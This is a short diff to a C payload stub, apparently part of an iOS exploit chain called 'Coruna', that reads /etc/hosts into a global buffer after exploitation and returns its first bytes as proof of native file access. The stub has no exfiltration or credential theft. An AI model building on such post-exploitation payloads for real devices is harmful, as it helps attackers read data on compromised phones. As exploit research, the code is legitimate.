@@ -1,23 +1,40 @@
-// Explicit declarations - no headers needed (avoids iOS SDK path issues)
+// collector_v2.c - File reader for Coruna exploit chain
+// Uses raw syscalls (no headers needed)
+// Compiled with -nostdlib, linked against iOS SDK
+
 extern int open(const char *path, int oflag, ...);
 extern long long read(int fd, void *buf, long long count);
 extern int close(int fd);
 
-#ifndef O_RDONLY
 #define O_RDONLY 0
-#endif
 
-// Called by Coruna exploit chain
-// Reads /etc/hosts, returns first 4 bytes as proof of native file access
+// Global variable - forces __DATA segment creation
+static volatile int _data_marker = 0xDEADBEEF;
+
+// Buffer for file data (in __DATA segment)
+static unsigned char _file_buf[4096];
+static int _file_size = 0;
+
+// Entry point called by Coruna exploit chain
+// Reads /etc/hosts, stores in _file_buf, returns first 4 bytes
 int _process(void *arg) {
+    // Reset
+    _file_size = 0;
+    for (int i = 0; i < 4096; i++) _file_buf[i] = 0;
+    
+    // Open /etc/hosts
     int fd = open("/etc/hosts", O_RDONLY);
     if (fd < 0) return -1;
     
-    unsigned char buf[4] = {0};
-    long long n = read(fd, buf, 4);
+    // Read file
+    long long n = read(fd, _file_buf, 4095);
     close(fd);
     
-    if (n < 4) return -2;
+    if (n <= 0) return -2;
     
-    return *(int*)buf;
+    _file_size = (int)n;
+    _file_buf[n] = 0; // null terminate
+    
+    // Return first 4 bytes as int (for verification)
+    return *(int*)_file_buf;
 }
